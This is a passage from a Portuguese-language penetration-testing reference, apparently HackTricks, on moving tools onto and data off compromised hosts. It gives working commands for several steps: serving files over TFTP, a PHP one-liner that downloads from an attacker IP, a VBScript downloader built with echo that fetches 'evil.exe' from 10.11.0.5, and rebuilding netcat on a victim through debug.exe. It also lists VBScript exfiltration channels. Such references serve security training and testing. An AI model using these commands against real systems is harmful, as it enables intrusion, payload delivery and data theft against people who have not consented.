O servidor cria um socket UDP e fica aguardando por requisições de leitura (RRQ) ou escrita (WRQ) de arquivos. Quando recebe uma requisição de leitura, o servidor verifica se o arquivo existe e, em caso positivo, envia os dados do arquivo em pacotes de dados (DATA) para o cliente. Quando recebe uma requisição de escrita, o servidor recebe os pacotes de dados enviados pelo cliente e os grava em um arquivo no disco.

Para utilizar o servidor TFTP em Python, basta executar o código. Certifique-se de que a porta 69 esteja aberta e que o arquivo que deseja transferir esteja no mesmo diretório do servidor.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
No **alvo**, conecte-se ao servidor Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Baixe um arquivo com um PHP em uma linha:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) é uma linguagem de script baseada em Visual Basic que é usada principalmente para automação de tarefas em sistemas Windows. É uma linguagem de script interpretada que pode ser executada em várias plataformas, incluindo servidores web, desktops e dispositivos móveis.

### Exfiltração de dados usando VBScript

A exfiltração de dados usando VBScript envolve o uso de scripts para transferir informações confidenciais de um sistema comprometido para um local controlado pelo atacante. Existem várias técnicas que podem ser usadas para exfiltrar dados usando VBScript, incluindo:

1. **HTTP POST**: O script VBScript pode ser usado para enviar dados para um servidor remoto usando uma solicitação HTTP POST. Os dados podem ser codificados e enviados como parte do corpo da solicitação.

2. **SMTP**: O VBScript pode ser usado para enviar dados por e-mail usando o protocolo SMTP. Os dados podem ser anexados a um e-mail e enviados para um endereço de e-mail controlado pelo atacante.

3. **FTP**: O VBScript pode ser usado para transferir dados para um servidor remoto usando o protocolo FTP. Os dados podem ser enviados como arquivos ou diretamente para o servidor FTP.

4. **DNS**: O VBScript pode ser usado para exfiltrar dados usando consultas DNS. Os dados podem ser codificados e enviados como parte de consultas DNS para um servidor controlado pelo atacante.

### Mitigação de exfiltração de dados usando VBScript

Para mitigar a exfiltração de dados usando VBScript, é importante implementar as seguintes práticas recomendadas:

1. **Restrição de execução de scripts**: Restrinja a execução de scripts VBScript apenas a locais confiáveis e evite a execução de scripts de fontes desconhecidas.

2. **Monitoramento de tráfego de rede**: Monitore o tráfego de rede em busca de atividades suspeitas, como transferências de dados incomuns ou tráfego para destinos não autorizados.

3. **Implementação de firewalls**: Implemente firewalls para controlar o tráfego de rede e bloquear conexões não autorizadas.

4. **Atualização de software**: Mantenha o software atualizado com as últimas correções de segurança para evitar vulnerabilidades que possam ser exploradas para exfiltrar dados.

5. **Conscientização do usuário**: Eduque os usuários sobre as práticas recomendadas de segurança cibernética, como evitar clicar em links ou abrir anexos de e-mails suspeitos.

Ao implementar essas práticas recomendadas, você pode reduzir o risco de exfiltração de dados usando VBScript e proteger seus sistemas contra ataques cibernéticos.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Vítima**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Esta é uma técnica incrível que funciona em máquinas Windows de 32 bits. A ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um depurador. Mas também pode reconstruí-los a partir de hexadecimal. Então a ideia é pegar binários, como o `netcat`. E então desmontá-lo em hexadecimal, colar em um arquivo na máquina comprometida e depois montá-lo com o `debug.exe`.

O `Debug.exe` só pode montar 64 kb. Portanto, precisamos usar arquivos menores que isso. Podemos usar o UPX para comprimi-lo ainda mais. Então vamos fazer isso:
```
upx -9 nc.exe
```
Agora ele pesa apenas 29 kb. Perfeito. Agora vamos desmontá-lo:
```
wine exe2bat.exe nc.exe nc.txt
```
Agora basta copiar e colar o texto em nosso shell do Windows. E ele automaticamente criará um arquivo chamado nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
